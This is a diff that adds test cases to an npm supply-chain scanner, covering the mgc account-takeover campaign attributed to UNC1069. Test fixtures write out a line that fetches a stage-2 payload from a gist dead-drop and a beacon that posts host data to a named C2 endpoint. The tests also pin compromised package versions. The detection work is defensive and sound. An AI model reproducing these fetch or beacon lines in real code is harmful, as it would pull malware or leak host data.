@@ -4643,4 +4643,109 @@ describe("Campaign Signatures", () => {
     });
   });
 
+  // =================================================================
+  // mgc account takeover - UNC1069 / WAVESHAPER.V2 (safedep, April 2026)
+  // =================================================================
+
+  describe("mgc account takeover / UNC1069 (April 2026)", () => {
+    it("should flag mgc@1.2.1 as a known-bad version", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "consumer",
+          version: "1.0.0",
+          dependencies: { mgc: "1.2.1" },
+        })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should NOT flag mgc@1.2.0, the last legitimate 2023 release", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "consumer",
+          version: "1.0.0",
+          dependencies: { mgc: "1.2.0" },
+        })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
+      );
+      expect(finding).toBeUndefined();
+    });
+
+    it("should detect the gist dead-drop the dropper fetches its stage 2 from", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "setup.cjs"),
+        'fetch("https://gist.githubusercontent.com/admondtamang/814132e794e5d007e9b8ebd223a9494f/raw/1c5d51c2002f452a4dd58a1a73a9dd90a7fe0297/linux.payload");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect the C2 gate endpoint", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "beacon.js"),
+        'const c2 = "https://admondtamang.com.np/gate"; post(c2, host);'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
+      );
+      expect(finding).toBeDefined();
+    });
+
+    it("should NOT flag the compromised maintainer's own GitHub account", async () => {
+      // admondtamang is the victim of an account takeover, not the attacker.
+      // Blocking the person rather than the specific gist path is the false
+      // positive this project deliberately avoids.
+      fs.writeFileSync(
+        path.join(tempDir, "deps.js"),
+        'const repo = "git+https://github.com/admondtamang/mgc.git";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
+      );
+      expect(finding).toBeUndefined();
+    });
+
+    it("resolves the pinned @zinley/orion versions and leaves the clean ones alone", () => {
+      const feed = getBundledFeed();
+
+      for (const version of ["1.2.31", "1.2.32", "1.2.34", "1.2.36", "1.2.38", "1.2.39"]) {
+        expect(
+          matchBareNpmIOC("@zinley/orion", version, feed),
+          `@zinley/orion@${version} must resolve as an npm IOC`,
+        ).toBeTruthy();
+      }
+
+      // 1.2.35, 1.2.37 and 1.2.40 are published and NOT flagged by the advisory.
+      // If these resolve, the pin has silently widened into a name-level block on
+      // a package that has 41 published versions and a real purpose.
+      for (const version of ["1.2.35", "1.2.37", "1.2.40"]) {
+        expect(
+          matchBareNpmIOC("@zinley/orion", version, feed),
+          `@zinley/orion@${version} is outside the advisory set`,
+        ).toBeNull();
+      }
+    });
+  });
+
 });
